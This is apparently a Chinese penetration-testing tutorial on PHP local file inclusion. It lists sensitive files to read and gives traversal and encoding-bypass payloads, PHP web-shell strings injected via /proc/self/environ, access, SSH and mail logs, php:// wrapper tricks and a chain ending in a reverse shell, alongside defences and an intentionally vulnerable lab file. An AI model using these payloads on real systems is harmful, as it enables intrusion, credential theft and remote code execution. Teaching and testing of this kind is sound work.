---
title: "文件包含漏洞：LFI本地文件包含"
date: 2025-08-15 08:00:00
tags:
  - Web安全
  - 渗透测试
description: LFI 本地文件包含——/etc/passwd 到 /proc、路径截断与日志文件利用。
categories: 渗透测试
---

## 一、概述

本地文件包含（Local File Inclusion，LFI）是指攻击者利用Web应用中不安全的文件包含机制，读取服务器本地文件甚至执行任意代码。与远程文件包含（RFI）不同，LFI聚焦于目标主机本地资源。

LFI常见于PHP中使用 `include()`、`require()`、`include_once()`、`require_once()` 且未对用户输入做充分过滤的场景。危害轻则泄露敏感信息，重则导致远程代码执行（RCE）。

```
用户输入: ?page=../../../etc/passwd  →  include($_GET['page'])  →  返回 /etc/passwd 内容
```

## 二、漏洞成因

```php
<?php
$file = $_GET['page'];
include($file . '.php');             // 拼接后缀但未过滤
include "/var/www/pages/" . $file;   // 限定目录但未拦截 ../
?>
```

开发者常误认为后缀硬编码（`.php`）或目录限定足以防御，但多种绕过手段使这些假设失效。核心原则：永远不要信任用户输入。

## 三、常见可读取的敏感文件

### 3.1 Linux

| 文件路径 | 内容 |
|---|---|
| `/etc/passwd` | 用户列表 |
| `/etc/shadow` | 密码哈希（需root） |
| `/etc/hosts` `/etc/hostname` | 主机信息 |
| `/etc/crontab` | 定时任务 |
| `/etc/apache2/apache2.conf` `/etc/nginx/nginx.conf` | Web服务器配置 |
| `/etc/mysql/my.cnf` | MySQL配置（可能含密码） |
| `/proc/self/environ` | 环境变量（含User-Agent等请求头） |
| `/proc/self/cmdline` | 进程启动命令 |
| `/proc/self/fd/0` ~ `/proc/self/fd/50` | 文件描述符枚举 |
| `/proc/version` `/proc/cpuinfo` | 系统指纹 |
| `/var/log/apache2/access.log` | Apache访问日志 |
| `/var/log/auth.log` | SSH认证日志 |
| `/var/log/mail.log` `/var/log/syslog` | 邮件/系统日志 |
| `/home/<user>/.ssh/id_rsa` | SSH私钥 |
| `/home/<user>/.bash_history` | 命令历史 |

### 3.2 Windows

| 文件路径 | 内容 |
|---|---|
| `C:\Windows\win.ini` | 系统配置 |
| `C:\boot.ini` | 引导配置 |
| `C:\Windows\System32\drivers\etc\hosts` | 主机名映射 |
| `C:\Windows\System32\config\SAM` | 密码哈希（锁定态不可读） |
| `C:\Windows\repair\SAM` `repair\system` | SAM/注册表备份 |
| `C:\xampp\php\php.ini` | PHP配置 |
| `C:\inetpub\wwwroot\web.config` | IIS配置 |

## 四、路径穿越与绕过技术

### 4.1 基本路径穿越

通过 `../` 向上跳转目录，突破应用限定的文件范围：

```
?page=../../../../etc/passwd
/var/www/html/pages/../../../../etc/passwd → /etc/passwd
```

### 4.2 Null Byte 截断（%00）—— 历史手法

PHP < 5.3.4 中，null byte 可截断字符串使硬编码后缀失效：

```
应用代码: include($file . '.php');
攻击载荷: ?page=../../../etc/passwd%00
实际执行: include("../../../etc/passwd\0.php") → 读取 /etc/passwd
```

现代 PHP 已修复，但遗留系统、嵌入式设备（路由器/摄像头/IoT）中仍存在。

### 4.3 编码绕过

```
../ → %2e%2e%2f          （全量URL编码）
../ → %2e%2e/ ..%2f      （部分编码）
../ → %252e%252e%252f    （双重URL编码，绕过单次解码过滤）
../ → ..%252f            （混合双重编码）
../ → ..%c0%af           （Unicode overlong UTF-8斜杠）
../ → ..%ef%bc%8f        （全角斜杠）
../ → ..\                （反斜杠，Windows兼容）
```

针对递归过滤（`str_replace('../', '', ...)`）的交错绕过：

```
....// → 过滤中间../ → 剩下 ../
..././ → 过滤后 ../../
```

### 4.4 路径长度截断（历史）

PHP < 5.2.8 中路径超过 4096 字节时超出部分被截断（部分文件系统上限不同），可绕过 `.php` 后缀拼接：

```
?page=../../../etc/passwd/./././. ... (填充至 4096+ 字节)
```

### 4.5 Windows 特殊手法

Windows 文件系统自动去除路径末尾的点号和空格：

```
?page=../../../boot.ini.       （末尾多余点号自动去除）
?page=../../../boot.ini%20     （末尾空格自动去除）
```

## 五、/proc 伪文件系统利用

### 5.1 /proc/self/environ

User-Agent 等 HTTP 请求头会出现在环境变量中。攻击者通过请求头注入 PHP 代码：

```http
GET /index.php?page=../../../proc/self/environ HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```

随后 `?page=/proc/self/environ&cmd=id` 即可执行命令。注意部分发行版已设 `/proc/self/environ` 为仅 root 可读（`0400`），但容器和旧系统中常可读。

### 5.2 /proc/self/fd/ 枚举

进程文件描述符可能指向已被 include 的文件或上传的临时文件。枚举 fd/0 ~ fd/50：

```
?page=/proc/self/fd/0   ?page=/proc/self/fd/12
```

此法在"文件上传+包含"场景尤为有效：PHP上传临时文件即便被删除，只要进程 fd 未关闭仍可读取。

### 5.3 /proc/self/cmdline

读取进程启动命令和参数，用于信息收集：

```
?page=/proc/self/cmdline    →  获取应用根路径、配置路径
```

## 六、日志文件污染（Log Poisoning）

将 PHP 代码写入日志文件，再通过 LFI 包含执行，是 LFI 升级为 RCE 的核心技术。

### 6.1 Apache 访问日志

```bash
nc target.com 80 << EOF
GET /<?php system(\$_GET['cmd']); ?> HTTP/1.1
Host: target.com

EOF
```

payload 写入 `/var/log/apache2/access.log`，随后：

```
?page=../../../var/log/apache2/access.log&cmd=id
```

### 6.2 SSH 认证日志（auth.log）

```bash
ssh '<?php system($_GET["cmd"]); ?>'@target.com
```

登录失败后，登录名记入 `/var/log/auth.log`，再通过 LFI 触发：

```
?page=../../../var/log/auth.log&cmd=whoami
```

### 6.3 邮件日志（mail.log）

通过 SMTP 发送含 php payload 的邮件头，污染 `/var/log/mail.log`：

```
HELO <?php system($_GET[0]); ?>
```

之后 `?page=../../../var/log/mail.log&0=id` 即可执行。

### 6.4 污染流程

```
发送含 <?php ... ?> 的请求 → payload写入日志 → LFI包含日志 → PHP引擎解析 → 代码执行 → 反弹Shell
```

## 七、PHP 封装器（Wrappers）

| 封装器 | 用途 | 示例 |
|---|---|---|
| `php://filter` | 编码读取 | `php://filter/convert.base64-encode/resource=config` |
| `php://input` | 执行 POST body 中 PHP 代码 | `php://input` |
| `data://` | 内联数据流 | `data://text/plain,<?php system('id');?>` |
| `expect://` | 执行命令（需扩展） | `expect://id` |
| `phar://` `zip://` | 压缩包内文件 | `phar://a.zip/b.txt` `zip://a.zip%23b.txt` |

### php://filter 读源码

Base64 编码后读取避免 PHP 解析（LFI 最常用信息收集手段）：

```
?page=php://filter/convert.base64-encode/resource=../../config
# 解码 Base64 获得 config.php 源码
```

组合过滤器绕过 WAF：

```
?page=php://filter/read=convert.base64-encode|convert.iconv.utf-8.utf-16/resource=index
```

## 八、Windows LFI 特殊技巧

PHP 在 Windows 上兼容正反斜杠，以下路径可等效：

```
C:\Windows\win.ini    C:/Windows/win.ini    /Windows/win.ini
..\..\..\Windows\win.ini    ../../../Windows/win.ini
```

UNC 路径在部分配置下可被包含：`//<attacker-ip>/share/shell.php`

关键 Windows 目标：

```
C:\Windows\System32\drivers\etc\hosts    ← 内网信息
C:\Windows\repair\SAM                     ← SAM 备份
C:\xampp\phpMyAdmin\config.inc.php        ← 数据库凭据
C:\Program Files\MySQL\my.ini             ← MySQL 密码
```

## 九、防御措施

### 9.1 白名单机制（推荐）

```php
<?php
$allowed = ['home', 'about', 'contact'];
$page = in_array($_GET['page'] ?? '', $allowed, true)
        ? $_GET['page'] : '404';
include "pages/{$page}.php";
?>
```

白名单不接收任何未预定义的值，是最彻底的防御。

### 9.2 输入过滤与配置加固

```php
<?php
$page = basename(realpath($_GET['page'] ?? ''));
$page = preg_replace('/[^a-zA-Z0-9_\-]/', '', $page);
include "pages/{$page}.php";
?>
```

PHP 配置：`allow_url_include = Off`、`open_basedir` 限制目录、`disable_functions` 禁用 exec/system/passthru/shell_exec/popen/proc_open。系统层面：Web 进程用低权限账户、敏感文件设最小权限（`chmod 000 /etc/shadow`）、定期审计日志。

## 十、完整攻击流程（Flowchart）

```
┌──────────────────────────────────┐
│   发现LFI入口: ?page= ?file= ?lang=   │
└───────────────┬──────────────────┘
                ↓
┌──────────────────────────────────┐
│ 基础测试: ../../../etc/passwd        │
└───────────────┬──────────────────┘
                ↓
        ┌───────┴───────┐
        ↓               ↓
    读取成功          读取失败
        ↓               ↓
  ┌─────────┐    ┌─────────────────┐
  │ 信息收集 │    │ 绕过测试         │
  │ passwd  │    │ URL编码/双重编码  │
  │ version │    │ Null Byte       │
  │ 配置文件 │    │ 交错 ../ 序列    │
  └────┬────┘    │ php://filter   │
       ↓         └────────┬────────┘
  ┌─────────┐             ↓
  │ 日志污染 │        读取成功 → 同上
  │ Access  │
  │ SSH/Mail│
  └────┬────┘
       ↓
  ┌─────────┐
  │  RCE    │
  │ ?cmd=id │
  └────┬────┘
       ↓
  ┌─────────┐
  │反弹Shell│
  │nc/bash  │
  │/dev/tcp │
  └─────────┘
```

## 十一、常见误区与注意事项

**误区一："后缀硬编码能防住"**：并非所有应用都加后缀；后缀可被 Null Byte 截断；PHP 封装器在有后缀时仍可正常工作。

**误区二："Null Byte 已绝迹"**：PHP >= 5.3.4 虽已修复，但遗留系统、老旧CMS、IoT设备仍运行旧版 PHP。Windows 对空字节的处理与 Linux 不同。

**误区三："Base64 只对 PHP 文件有效"**：`php://filter` 可对任意文件（含 `/etc/passwd`）编码输出；WAF 可能仅拦截直接路径穿越而未覆盖封装器变体。

**实战略注意事项**：
- 日志路径：Debian/Ubuntu 为 `/var/log/apache2/`，RHEL/CentOS 为 `/var/log/httpd/`
- `/proc/self/environ` 现常仅 root 可读，容器和旧系统中可能例外
- 日志污染痕迹不可擦除，需评估溯源性风险
- 若有文件上传功能，结合 `/proc/self/fd/` 枚举可能突破
- Windows + IIS + PHP 环境中 `..\` 与 `../` 混用可导致过滤失效

## 十二、实验环境与免责声明

**本地靶场**（仅供学习，严禁部署到生产环境）：

```php
<?php $page = $_GET['page'] ?? 'welcome'; include($page . '.php'); ?>
```

```bash
# 测试命令
curl "http://localhost/lab.php?page=../../../etc/passwd%00"
curl "http://localhost/lab.php?page=php://filter/convert.base64-encode/resource=../../../etc/passwd"
curl -H "User-Agent: <?php system('id');?>" "http://localhost/lab.php?page=/proc/self/environ"
```

## 免责声明

**本文仅供安全研究与学习目的。** 文中所述技术不得用于未经授权的系统测试或攻击行为。使用者应确保仅在获得明确授权的目标上或自建的隔离环境中进行实践。作者对任何滥用文中技术所造成的后果不承担任何责任。渗透测试从业者应遵循 OWASP Testing Guide、PTES 等行业标准，在授权范围内进行安全评估并妥善保护客户数据。

---

*参考资料: OWASP Testing Guide, PortSwigger Web Security Academy, MITRE CWE-98, PHP Manual - Streams & Wrappers*
